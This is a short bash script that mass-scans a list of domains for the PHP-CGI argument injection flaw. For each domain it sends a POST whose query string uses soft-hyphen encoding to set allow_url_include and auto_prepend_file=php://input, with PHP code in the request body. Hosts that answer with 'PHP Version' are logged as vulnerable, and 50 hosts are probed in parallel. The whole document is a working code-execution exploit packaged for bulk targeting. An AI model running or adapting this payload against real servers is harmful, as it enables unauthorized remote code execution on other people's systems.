#!/bin/bash

# Function to check vulnerability for a domain
check_vulnerability() {
    local domain=$1
    echo "Checking vulnerability for: $domain"
    local response=$(curl -s -X POST "${domain}/test.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input" \
        -H "User-Agent: curl/8.3.0" \
        --data "<?php phpinfo(); ?>" \
        --max-time 3 \
        --connect-timeout 2)

    if [[ $response == *"PHP Version"* ]]; then
        echo -e "\e[1;31m$domain: Vulnerable\e[0m"  # Bold red text
        echo "$domain" >> vulnerable_domains.txt  # Save to file
    else
        echo "$domain: Not Vulnerable"
    fi
}

export -f check_vulnerability

# Main function to iterate over domains
main() {
    local file=$1
    echo "Starting vulnerability check for domains in file: $file"
    > vulnerable_domains.txt  # Clear the file at the start
    cat "$file" | parallel -j 50 check_vulnerability {}
    echo "Completed vulnerability check."
}

# Check if the file argument is provided
if [ "$#" -ne 1 ]; then
    echo "Usage: $0 <domain_list_file>"
    exit 1
fi

# Call the main function with the domain list file
main "$1"

